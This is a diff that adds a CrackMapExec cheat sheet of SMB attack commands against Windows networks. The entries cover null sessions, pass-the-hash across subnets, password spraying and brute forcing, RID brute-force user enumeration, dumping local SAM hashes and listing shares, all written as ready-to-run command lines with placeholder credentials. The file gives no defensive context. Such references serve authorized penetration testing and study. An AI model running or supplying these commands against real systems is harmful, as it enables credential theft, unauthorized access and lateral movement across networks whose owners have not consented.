@@ -1,0 +1,43 @@
+#Target format
+    - crackmapexec smb ms.evilcorp.org
+    - crackmapexec smb 192.168.1.0 192.168.0.2
+    - crackmapexec smb 192.168.1.0-28 10.0.0.1-67
+    - crackmapexec smb 192.168.1.0/24
+    - crackmapexec smb targets.txt
+==================================================================================================
+#Null session
+    - crackmapexec smb 192.168.10.1 -u "" up ""
+==================================================================================================
+#Connect to target using local account
+    - crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
+==================================================================================================
+#Pass the hash against a subnet
+    - crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
+    - crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'
+==================================================================================================
+#Bruteforcing and Password Spraying
+    - crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
+    - crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
+    - crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
+    - crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
+    - crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
+==================================================================================================
+#USER
+Enumerate users
+    - crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users
+
+Perform RID Bruteforce to get users
+    - crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute
+
+Enumerate domain groups
+    - crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups
+
+Enumerate local users
+    - crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
+==================================================================================================
+# Dump local SAM hashes
+    - crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
+==================================================================================================
+#List Shares 
+    - crackmapexec smb 10.10.10.175 --shares
+    - crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --shares
